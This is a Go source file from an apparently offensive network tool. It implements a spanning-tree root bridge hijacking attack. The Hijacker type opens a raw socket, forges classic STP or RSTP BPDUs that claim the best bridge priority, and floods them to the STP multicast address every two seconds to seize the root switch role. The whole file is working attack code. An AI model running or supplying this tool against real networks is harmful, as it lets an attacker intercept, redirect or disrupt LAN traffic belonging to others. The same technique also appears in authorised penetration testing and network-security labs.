package stp

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"time"
)

const (
	stpTag      = "\x1b[33m[STP]\x1b[0m"
	rstpTag     = "\x1b[33m[RSTP]\x1b[0m"
	sendInterval = 2 * time.Second
)

var stpMulticast = [6]byte{0x01, 0x80, 0xC2, 0x00, 0x00, 0x00}

type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Hijacker injects forged STP or RSTP BPDUs to capture the root role.
type Hijacker struct {
	Interface string
	MAC       string
	RSTP      bool
}

func (h *Hijacker) Run() error {
	iface, err := net.InterfaceByName(h.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", h.Interface, err)
	}
	mac, err := ParseMAC(h.MAC)
	if err != nil {
		return fmt.Errorf("invalid --mac %q: %w", h.MAC, err)
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	tag := stpTag
	var frame []byte
	if h.RSTP {
		tag = rstpTag
		frame = build8023Frame(mac, buildRSTPBPDU(mac))
		fmt.Printf("%s Start of RSTP injection. Interception of the root switch role... You can check this from Wireshark\n", tag)
	} else {
		frame = build8023Frame(mac, buildClassicSTPBPDU(mac))
		fmt.Printf("%s Start of STP injection. Interception of the root switch role... You can check this from Wireshark\n", tag)
	}
	fmt.Printf("%s Press Ctrl+C to stop.\n", tag)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", tag)
		os.Exit(0)
	}()

	ticker := time.NewTicker(sendInterval)
	defer ticker.Stop()

	if err := sock.Send(frame); err != nil {
		return fmt.Errorf("send: %w", err)
	}
	for range ticker.C {
		if err := sock.Send(frame); err != nil {
			return fmt.Errorf("send: %w", err)
		}
	}
	return nil
}

func build8023Frame(srcMAC net.HardwareAddr, bpdu []byte) []byte {
	llc := []byte{0x42, 0x42, 0x03}
	payload := append(llc, bpdu...)
	frame := make([]byte, 14+len(payload))
	copy(frame[0:6], stpMulticast[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], uint16(len(payload)))
	copy(frame[14:], payload)
	return frame
}

func buildClassicSTPBPDU(mac net.HardwareAddr) []byte {
	bpdu := make([]byte, 35)
	bpdu[3] = 0x01
	copy(bpdu[6:12], mac)
	copy(bpdu[18:24], mac)
	putTimer(bpdu[26:28], 1)
	putTimer(bpdu[28:30], 20)
	putTimer(bpdu[30:32], 2)
	putTimer(bpdu[32:34], 15)
	return bpdu
}

func buildRSTPBPDU(mac net.HardwareAddr) []byte {
	bpdu := make([]byte, 35)
	bpdu[1] = 0x02
	bpdu[3] = 0x3c
	binary.BigEndian.PutUint16(bpdu[4:6], 0x0001)
	copy(bpdu[6:12], mac)
	binary.BigEndian.PutUint32(bpdu[12:16], 0x00000001)
	binary.BigEndian.PutUint16(bpdu[16:18], 0x0001)
	copy(bpdu[18:24], mac)
	binary.BigEndian.PutUint16(bpdu[24:26], 0x0001)
	putTimer(bpdu[26:28], 1)
	putTimer(bpdu[28:30], 20)
	putTimer(bpdu[30:32], 2)
	putTimer(bpdu[32:34], 15)
	return bpdu
}

func putTimer(b []byte, seconds int) {
	binary.BigEndian.PutUint16(b, uint16(seconds*256))
}

// ParseMAC parses a MAC address, tolerating non-zero-padded octets.
func ParseMAC(s string) (net.HardwareAddr, error) {
	s = strings.TrimSpace(s)
	if parts := strings.Split(s, ":"); len(parts) == 6 {
		for i, p := range parts {
			if len(p) == 1 {
				parts[i] = "0" + p
			}
		}
		s = strings.Join(parts, ":")
	}
	mac, err := net.ParseMAC(s)
	if err != nil {
		return nil, err
	}
	if len(mac) != 6 {
		return nil, fmt.Errorf("expected 6-byte MAC, got %d bytes", len(mac))
	}
	return mac, nil
}
